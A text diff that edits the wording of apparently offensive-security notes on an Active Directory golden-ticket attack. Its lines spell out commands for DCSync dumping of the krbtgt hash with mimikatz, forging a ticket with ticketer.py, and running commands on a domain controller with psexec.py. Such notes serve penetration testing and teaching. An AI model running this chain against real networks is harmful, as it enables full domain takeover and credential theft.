@@ -83,7 +83,7 @@ Domain SID Lookup: `lookupsid.py <DOMAIN_FQDN>/<USERNAME>@<DC_IP>`
 
 ![domain-sid-lookup](domain-sid-lookup.jpg)
 
-Obtaining `krbtgt` hash: `lsadump::dcsync /domain:<DOMAIN_FQDN> /user:krbtgt`
+Obtaining the `krbtgt` account's hash: `lsadump::dcsync /domain:<DOMAIN_FQDN> /user:krbtgt`
 
 ![krbtgt-hash](krbtgt-hash.jpg)
 
@@ -91,7 +91,7 @@ Golden ticket creation: `ticketer.py -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_S
 
 ![golden-ticket-created](golden-ticket-created.jpg)
 
-Exporting ticket to environment: `export KRB5CCNAME=/<CHOSEN_USERNAME>.ccache`
+Exporting ticket to the environment: `export KRB5CCNAME=/<CHOSEN_USERNAME>.ccache`
 
 Command execution using ticket: `psexec.py <DOMAIN_FQDN>/<CHOSEN_USERNAME>@<DC_FQDN> -k -no-pass`
 
